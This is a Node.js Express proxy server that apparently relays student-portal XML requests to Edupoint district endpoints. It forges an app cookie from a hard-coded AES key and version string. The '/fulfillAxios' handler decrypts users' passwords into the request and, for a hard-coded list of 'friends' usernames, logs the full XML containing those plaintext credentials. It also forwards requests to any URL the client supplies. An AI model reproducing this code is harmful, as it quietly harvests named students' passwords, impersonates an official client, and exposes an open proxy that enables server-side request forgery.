const express = require('express');
const axios = require('axios');
const cors = require('cors');
const CryptoJS = require('crypto-js');
const crypto = require('crypto');

const app = express();
app.use(express.json()); // Parse incoming JSON requests
app.options('*', cors());
app.use(cors());
app.use(express.static('public'));

const encryptionKey = process.env.encryptionkey;
var apikey=generateKey();

function decryptDetails(details){
    const bytes = CryptoJS.AES.decrypt(details.password, encryptionKey);
    const originalText = bytes.toString(CryptoJS.enc.Utf8);
    return(originalText)
}

function getCurrentDateMMDDYYYY() {
    const date = new Date();
    const month = String(date.getMonth() + 1).padStart(2, '0'); // Months are 0-based, so +1
    const day = String(date.getDate()).padStart(2, '0');
    const year = date.getFullYear();

    return `${month}${day}${year}`;
}



function generateKey() {
  try {
    // Prepare key and IV
    let keyBytes = Buffer.alloc(32);  // 32-byte key for AES-256
    let ivBytes = Buffer.alloc(16);   // 16-byte IV for AES

    // Copy the key and IV data
    Buffer.from('b2524efb438b4532b322e633d5aff252', 'utf-8').copy(keyBytes, 0, 0, 32);
    Buffer.from('AES', 'utf-8').copy(ivBytes, 0, 0, 3);

    console.log("Key Bytes: ", keyBytes);
    console.log("IV Bytes: ", ivBytes);

    // Create the cipher instance using AES-256-CBC and the key and IV
    const cipher = crypto.createCipheriv('aes-256-cbc', keyBytes, ivBytes);

    // Encrypt the input string
    const today=getCurrentDateMMDDYYYY();
    let input = `${today}|8.7.0|${today}|android`;
    let encrypted = cipher.update(input, 'utf-8', 'base64');
    encrypted += cipher.final('base64');

    console.log('Encrypted String:', encrypted);
    return(encrypted)
  } catch (error) {
    console.error(error);
  }
}

// Call the function



const friends={"149907":"blake","10016976":"isaac","153486":"asher","151376":"luke","269979":"dylan","125105":"brady"}
const regions=new Map()
const regionURLs=[]


setInterval(()=>{
    apikey=generateKey();
},86400000);


app.get("/userCount/:region",async(req,res)=>{
    try{
        const region=parseInt(req.params.region,10);
        if(isNaN(region)){throw new Error("Region must be number")}else{
            res.send(regionURLs[region]+"\n User Count: "+regions.get(regionURLs[region]).size)
        }


    }
    catch(error){res.send(error.message)}
})


app.post("/fulfillAxios",async(req,res)=>{
  try{
  const details=req.body;
  if(!regions.has(details.url)){regions.set(details.url,new Set());regionURLs.push(details.url)}
  else{
    if(!regions.get(details.url).has(details.username)){regions.get(details.url).add(details.username)}
  }
  if(details.encrypted){
    const password=decryptDetails(details);
    details.xml=details.xml.replace(details.password,password)
  }
    console.log(details.url);
      if(friends.hasOwnProperty(details.username)){console.log(friends[details.username]);console.log(details.xml)}
try{
  var response=await axios.post(details.url,details.xml,{headers: {
            'Content-Type': 'text/xml',
            "Cookie":"edupointkeyversion="+apikey+";"
          }})}catch(error){if(error.code=="ECONNRESET"){throw new Error("Network Error")}else{throw error}}
  res.json({status:true,response:response.data});
  }catch(error){console.log(error);res.json({status:false,message:error.message})}})

app.post("/encryptPassword",(req,res)=>{
  const details=req.body;
  res.json({encryptedPassword:CryptoJS.AES.encrypt(details.password, encryptionKey).toString()})
})

app.listen(3000, () => {
    ////console.log('Server is running on port 3000');
});
//g
